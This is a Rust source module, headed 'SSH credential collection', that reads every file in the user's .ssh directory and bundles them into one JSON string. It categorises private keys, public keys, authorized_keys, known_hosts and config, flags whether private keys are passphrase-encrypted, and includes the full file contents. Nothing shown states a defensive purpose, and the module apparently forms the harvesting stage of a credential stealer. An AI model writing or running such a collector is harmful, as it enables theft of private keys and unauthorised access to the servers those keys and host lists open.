//! SSH credential collection — private/public keys, authorized_keys, known_hosts.

use base64::Engine;
use std::path::Path;

pub struct SshKeys;

#[derive(PartialEq, Clone, Copy)]
enum Category {
    PrivateKey,
    PublicKey,
    AuthorizedKeys,
    KnownHosts,
    Config,
    Other,
}

impl Category {
    fn as_str(self) -> &'static str {
        match self {
            Category::PrivateKey => "private-key",
            Category::PublicKey => "public-key",
            Category::AuthorizedKeys => "authorized-keys",
            Category::KnownHosts => "known-hosts",
            Category::Config => "config",
            Category::Other => "other",
        }
    }
}

impl SshKeys {
    pub fn collect() -> String {
        let ssh_dir = Path::new(&home_dir()).join(".ssh");
        let dir_str = ssh_dir.to_string_lossy().to_string();

        let mut files: Vec<std::path::PathBuf> = match std::fs::read_dir(&ssh_dir) {
            Ok(entries) => entries
                .filter_map(|e| e.ok())
                .map(|e| e.path())
                .filter(|p| p.is_file())
                .collect(),
            Err(_) => return format!(r#"{{"sshDir":"{}","total":0,"items":[]}}"#, escape(&dir_str)),
        };
        files.sort();

        let mut items = Vec::new();
        for file in files {
            let Ok(bytes) = std::fs::read(&file) else { continue };
            let name = file
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            let text = String::from_utf8_lossy(&bytes);
            let category = categorize(&name, &text);
            let encrypted = category == Category::PrivateKey && is_encrypted(&text);
            let content = if bytes.is_ascii() {
                text.to_string()
            } else {
                base64::engine::general_purpose::STANDARD.encode(&bytes)
            };

            items.push(format!(
                r#"{{"name":"{}","path":"{}","category":"{}","encrypted":{},"size":{},"content":"{}"}}"#,
                escape(&name),
                escape(&file.to_string_lossy()),
                category.as_str(),
                encrypted,
                bytes.len(),
                escape(&content),
            ));
        }

        format!(
            r#"{{"sshDir":"{}","total":{},"items":[{}]}}"#,
            escape(&dir_str),
            items.len(),
            items.join(",")
        )
    }
}

fn categorize(name: &str, content: &str) -> Category {
    let lower = name.to_lowercase();
    if lower.ends_with(".pub") {
        return Category::PublicKey;
    }
    match lower.as_str() {
        "authorized_keys" | "authorized_keys2" => Category::AuthorizedKeys,
        "known_hosts" | "known_hosts.old" => Category::KnownHosts,
        "config" => Category::Config,
        _ => {
            if content.contains("PRIVATE KEY") && content.contains("-----BEGIN") {
                Category::PrivateKey
            } else if is_private_key_name(&lower) {
                Category::PrivateKey
            } else {
                Category::Other
            }
        }
    }
}

fn is_private_key_name(lower: &str) -> bool {
    matches!(
        lower,
        "id_rsa" | "id_ed25519" | "id_ecdsa" | "id_dsa" | "identity"
    ) || (lower.starts_with("id_") && !lower.ends_with(".pub"))
}

fn is_encrypted(content: &str) -> bool {
    if content.contains("ENCRYPTED") {
        return true;
    }
    if content.contains("OPENSSH PRIVATE KEY") {
        let body: String = content
            .lines()
            .filter(|l| !l.trim_start().starts_with("-----"))
            .collect();
        let cleaned: String = body.chars().filter(|c| !c.is_whitespace()).collect();
        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(cleaned) {
            let s = String::from_utf8_lossy(&decoded);
            return s.contains("bcrypt") || s.contains("@openssh.com") || s.contains("aes256");
        }
    }
    false
}

fn home_dir() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Default".into()) }
    #[cfg(not(target_os = "windows"))]
    { std::env::var("HOME").unwrap_or_else(|_| "/root".into()) }
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}
